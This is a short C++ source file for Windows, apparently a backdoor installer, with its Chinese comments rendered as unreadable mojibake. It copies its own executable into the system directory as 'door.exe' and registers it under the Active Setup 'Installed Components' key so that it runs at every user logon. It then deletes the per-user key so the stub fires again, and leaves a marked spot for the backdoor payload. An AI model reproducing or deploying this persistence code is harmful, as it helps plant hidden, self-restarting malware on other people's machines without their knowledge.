// active.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>

//�����޸��ַ������ͼ�ֵ
void CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
{
	HKEY hKey;
	//��ע�������������򴴽���
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	//�޸�ע����ֵ��û���򴴽���
	lRet=RegSetValueEx(hKey,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
	 if (lRet!=ERROR_SUCCESS)
	 {
		 printf("error no RegSetValueEx %s\n", ValueName);
		 return ;
	 }
	RegCloseKey(hKey);
}


int main(int argc, char* argv[])
{
	HKEY hKey;
    DWORD dwDpt=REG_OPENED_EXISTING_KEY;
	//��HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{E92B03AB-A707-11d2-9CBD-0000F87A369H}
    long lRet=RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{E92B03AB-A707-11d2-9CBD-0000F87A369H}",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,&hKey);
    //�������򣬸��������ļ���ϵͳĿ¼�ͣ�����ActiveX����
	if (lRet!=ERROR_SUCCESS)
	{
		char SelfFile[MAX_PATH];
		char SystemPath[512];
		//�õ�ϵͳĿ¼·��
		GetSystemDirectory(SystemPath,sizeof(SystemPath));
		strcat(SystemPath,"\\door.exe");
		//�õ��������·��
		GetModuleFileName (NULL, SelfFile, MAX_PATH);	
		//�����ļ�
		CopyFile(SelfFile,SystemPath,true);
		//����ActiveX����,һ���Զ����޸�ע���ĺ�����ǰ���Ѿ�����õ�
		CreateStringReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{E92B03AB-A707-11d2-9CBD-0000F87A369H}","StubPath",SystemPath);
		return 0;
	}
	//����ɾ��HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{E92B03AB-A707-11d2-9CBD-0000F87A369H}
	RegDeleteKey(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{E92B03AB-A707-11d2-9CBD-0000F87A369H}");
	//.................���Ŵ���
	return 0;
}
